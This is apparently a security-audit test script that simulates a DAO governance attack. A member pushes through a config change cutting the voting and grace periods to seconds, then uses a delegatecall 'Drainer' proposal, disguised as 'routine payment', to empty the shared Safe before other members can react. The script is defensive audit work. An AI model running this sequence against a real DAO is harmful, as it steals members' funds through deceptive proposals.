/**
 * Component 7, row ECO-04: a Config proposal collapses the reaction window for every later proposal.
 * Step 1 (visible 12 h): A proposes Config votingPeriod 4 s / gracePeriod 1 s; only A votes. Step 2:
 * under 4 s / 1 s, A proposes "drain the Safe to A" and, emulating Base's 2 s blocks, it is voted,
 * graced and executed within 3 blocks (6 s): a member polling hourly (README cadence) has 0 blocks in
 * which to vote or exit. Expected: demonstrated; the DAO is left at 4 s / 1 s, where only a proposer
 * who votes within the same 4 s window can pass anything (a repair Config included).
 */
import { encodeFunctionData } from "viem";

import { assert, fmtS, processProposal, proposalInfo, propose, proposeTemplate, read, runIfMain, seedMembers, shutdown, snapshot, stateOf, step, verdict, vote, warp, warpPastGrace } from "../../../scenarios/lib.js";
import { INITIAL_GOVERNANCE } from "../../../src/zeroOne.js";
import { bootAudit, deployAudit } from "./lib-audit.js";

export async function main(): Promise<void> {
  const mirror = await bootAudit("audit-eco04");
  let passed = false;
  try {
    await seedMembers(mirror);
    const A = mirror.actors.A.account.address;
    step("step 1: A (32.8% of shares) proposes Config votingPeriod 4 s / gracePeriod 1 s; B, C, F stay silent for 12 h");
    const config = await proposeTemplate(mirror, "A", { template: "Config", params: { ...INITIAL_GOVERNANCE, votingPeriod: 4, gracePeriod: 1 } }, "A: speed up governance (4 s voting, 1 s grace)");
    await vote(mirror, "A", config.id, true);
    await warpPastGrace(mirror, config.id);
    const applied = await processProposal(mirror, "B", config);
    assert(applied.info.status.passed && !applied.info.status.actionFailed, "Config applied with yes 1000 / no 0 (silence is consent)");
    assert(Number(await read<number>(mirror, "baal", "votingPeriod")) === 4 && Number(await read<number>(mirror, "baal", "gracePeriod")) === 1, "votingPeriod 4 s, gracePeriod 1 s");

    step("step 2: A proposes 'move the whole Safe balance to A' (delegatecall Drainer) and drives it through in 2 s blocks");
    const before = await snapshot(mirror, "before drain", ["F", "A", "B", "C"]);
    const drainer = await deployAudit(mirror.actors.A, "Drainer");
    const t0 = Number((await mirror.chain.publicClient.getBlock()).timestamp);
    const drain = await propose(mirror, "A", [{ to: drainer.address, operation: 1, data: encodeFunctionData({ abi: drainer.artifact.abi, functionName: "drain", args: [mirror.dao.settlement, A] }) }], "A: routine payment");
    const info = await proposalInfo(mirror, drain.id);
    console.log(`   submitted at ${info.votingStarts} (block time ${t0}); votingEnds ${info.votingEnds} (+${info.votingEnds - info.votingStarts} s); graceEnds ${info.graceEnds} (+${info.graceEnds - info.votingStarts} s)`);
    // propose() already warped +1 s (block 1). Block 2 at +2 s: vote.
    await warp(mirror, 1, "block 2 (t+2 s)");
    await vote(mirror, "A", drain.id, true);
    await warp(mirror, 2, "block 3 (t+4 s)");
    console.log(`   state at t+4 s: ${await stateOf(mirror, drain.id)}`);
    await warp(mirror, 2, "block 4 (t+6 s)");
    assert((await stateOf(mirror, drain.id)) === "Ready", "Ready at t+6 s: 3 blocks after submission");
    const executed = await processProposal(mirror, "A", drain);
    const after = await snapshot(mirror, "after drain", ["F", "A", "B", "C"]);
    assert(executed.info.status.passed && !executed.info.status.actionFailed && after.safeSettlement === 0n, `A took ${fmtS(before.safeSettlement)} USDC ${Number((await mirror.chain.publicClient.getBlock()).timestamp) - t0} s after submitting`);
    console.log(`   B, C, F lost ${fmtS(before.safeSettlement - 1_000n * 10n ** 6n)} USDC with 0 blocks in which an hourly poller could act; the only defence was step 1 (vote NO / exit against a Config that looked administrative)`);

    step("aftermath: at 4 s / 1 s nobody but a same-window voter can pass anything again");
    const repair = await proposeTemplate(mirror, "B", { template: "Config", params: INITIAL_GOVERNANCE }, "B: restore 6 h / 6 h");
    await warp(mirror, 6, "6 s later (one hourly poll is 3600 s)");
    console.log(`   repair proposal state after 6 s without a vote: ${await stateOf(mirror, repair.id)} (Defeated: 0 yes > 0 no is false)`);
    passed = true;
  } finally {
    verdict("ECO-04 config-shortening", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
